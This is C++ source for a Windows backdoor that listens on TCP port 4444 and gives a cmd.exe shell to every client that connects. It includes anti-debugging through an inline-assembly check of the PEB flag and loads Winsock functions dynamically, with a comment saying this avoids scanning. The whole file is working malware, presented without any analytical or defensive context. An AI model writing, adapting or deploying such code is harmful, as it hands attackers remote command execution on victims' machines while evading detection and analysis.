#include <iostream>
#include "windows.h"
#include "lib/IPType.h"

//#include <winsock2.h>
//#pragma comment("lib","ws_32.lib")

#define ETHERNET 0x06

typedef DWORD LPWSAPROTOCOL_INFOA;
typedef BYTE GROUP;

typedef int ( __stdcall * _WSAStartup )( WORD, LPWSADATA  );
typedef SOCKET( __stdcall * _WSASocket )( int, int, int, LPWSAPROTOCOL_INFOA, GROUP, DWORD ); 
typedef int( __stdcall * _WSACleanup )( );
typedef int( __stdcall * _bind )( SOCKET, const sockaddr *, int );
typedef int( __stdcall * _close )( SOCKET );
typedef int( __stdcall * _listen )( SOCKET, int );
typedef SOCKET( __stdcall * _accept )( SOCKET, const sockaddr *, int );;

typedef ULONG( __stdcall * _GetAdaptersInfo)( PIP_ADAPTER_INFO, PULONG );
 
bool presentDebugger( ){
	
	asm(
	"movl $0x30,%ebx\n\t"
	"movl %fs:(%ebx), %eax\n\t"
	"movl 0x2(%eax),%eax\n\t"
	"and $0xff, %eax"
	);

}

int getNetworkAddr( char ** ip4  ){
	
	PIP_ADAPTER_INFO pai;
	PIP_ADAPTER_INFO lpai;
	HMODULE iptype;
	_GetAdaptersInfo GetAdaptersInfo;
	ULONG	outl;
	DWORD 	retV;
	int 	iplen;
	
	if( (iptype = LoadLibrary("Iphlpapi.dll")) == NULL ){
		printf("[-] cannot load Iphlpapi.dll");
		return -1;
	}
	
	if( (GetAdaptersInfo = ( _GetAdaptersInfo )GetProcAddress( iptype, "GetAdaptersInfo" )) == 0 ){
		printf("[-] cannot load GetAdapterInfo");
		FreeLibrary(iptype);
		return -1;
	}

	
	if( (pai = ( IP_ADAPTER_INFO *)malloc( sizeof( IP_ADAPTER_INFO ) )) != NULL )
	if( ( retV = GetAdaptersInfo( pai, &( outl = sizeof( IP_ADAPTER_INFO ) ) ) ) == NO_ERROR ){
		
		// Ethernet
		lpai = pai;
		if( lpai->Type == ETHERNET ){
		
			*ip4 = ( char * ) malloc( ( iplen = strlen(lpai->IpAddressList.IpAddress.String)+1 ) );
			memset( *ip4, 0, iplen );
			memcpy( 
				*ip4, 
				lpai->IpAddressList.IpAddress.String,
				iplen
			);
		}
		
	};
	
	free(lpai);
	free(pai);
	FreeLibrary(iptype);
	
return 0;
}


int main(int argc, char** argv) {
	
	/*
	 # pass just one argv
	 # avoid scan
	*/
	if( presentDebugger() || argc < 2 ){
		printf("\r\n\tsoft.exe [<ipv4> | <laod>]\r\n");
		ExitProcess(0);
	}

	HMODULE ws2_32;
	WSADATA wsd;
	SOCKET  sock;
	sockaddr_in sin;
	char * ip4;
	
	// fct
	_WSAStartup Startup;
	_WSACleanup clean;
	_close		close;
	_bind 		bind;
	_listen 	listen;
	_accept		accept;
	
	if( (ws2_32 = LoadLibrary("ws2_32.dll")) == NULL ){
		printf("[-] cannot load ws2_32.dll");
		ExitProcess(0);
	}
	
	// load fcts
	Startup = ( _WSAStartup )GetProcAddress( ws2_32, "WSAStartup" );
	clean   = ( _WSACleanup )GetProcAddress( ws2_32, "WSACleanup" );
	close   = ( _close )GetProcAddress( ws2_32, "closesocket" );
	bind    = ( _bind )GetProcAddress( ws2_32, "bind" );
	listen  = ( _listen )GetProcAddress( ws2_32, "listen" );
	accept = ( _accept )GetProcAddress( ws2_32, "accept" );
	
	if( Startup == 0 || clean == 0 || close == 0 || bind == 0 || listen == 0 || accept == 0 ){
		printf("[-] Bad loading handle ");
		ExitProcess(0);
		FreeLibrary(ws2_32);
	}
	
	memset( &wsd, 0, sizeof(wsd));
	if( Startup( (WORD)0x2020, &wsd ) != 0 ){
		printf("[-] WSAStartup failed !");
		clean();
		ExitProcess(0);
	}
	
	_WSASocket socket;
	socket = ( _WSASocket )GetProcAddress( ws2_32, "WSASocketA" );
	if( ( sock = socket(  AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL,  (unsigned int )NULL, (unsigned int )NULL ) ) == -1 ){
		printf("[-] WSocket failed !\r\n");
		clean();
		ExitProcess(0);
	}
	

	/*
	 # try to catche INET4
	*/
	if( getNetworkAddr( &ip4 ) == -1 ){
		
		if( inet_addr(argv[1]) > 0 )
		ip4 = argv[1];
		else{
			printf("[-] Cannot resolve ipv4\r\n[+] >soft.exe <ipv4>");
			close(sock);
			clean();
			ExitProcess(0);
		}
	}
	
	memset( &sin, 0, sizeof(sin));
	sin.sin_family 		= AF_INET;
	sin.sin_port   		= htons(4444);
	sin.sin_addr.s_addr = inet_addr(ip4);
	
	free(ip4);
	
	if(bind( sock, ( SOCKADDR* ) &sin, sizeof(sin) ) != 0 ){
		printf("[-] Bind failed <%i>\r\n", WSAGetLastError() );
		clean();
		ExitProcess(0);
	}
	
	if( listen( sock, 1 ) != 0 ){
		printf("[-] listen failed <%i>\r\n", WSAGetLastError() );
		clean();
		ExitProcess(0);	
	}
	
	/*
	 # 
	*/
	for(;;){
		
		SOCKADDR_IN csin = {0};
		SOCKET clts = accept( sock, NULL, NULL );
		if( clts != INVALID_SOCKET ){
			
			printf("[+] New Connection clients\r\n");
			
			STARTUPINFO si;
			PROCESS_INFORMATION pi;
			
			memset(&si, 0, sizeof(si));
			si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
			si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)clts;
			
			if( !CreateProcessA( 
				NULL,
				"cmd.exe", 
				NULL, 
				NULL, 
				true, 
				0, 
				NULL, 
				NULL, 
				&si, &pi 
			) ){
				printf("[-] Cannot create remote shell\r\n");
				close(clts);
				clean();
			}else{
				printf("[+] A remote shell has been created !\r\n");
				WaitForSingleObject( pi.hProcess, INFINITE );
				CloseHandle(pi.hProcess);
				CloseHandle(pi.hThread);
			}
			
		}
		
		Sleep( 200 );
		
	}
	

	close(sock);
	clean();
	FreeLibrary(ws2_32);
	ExitProcess(0);
	
return 0;
}
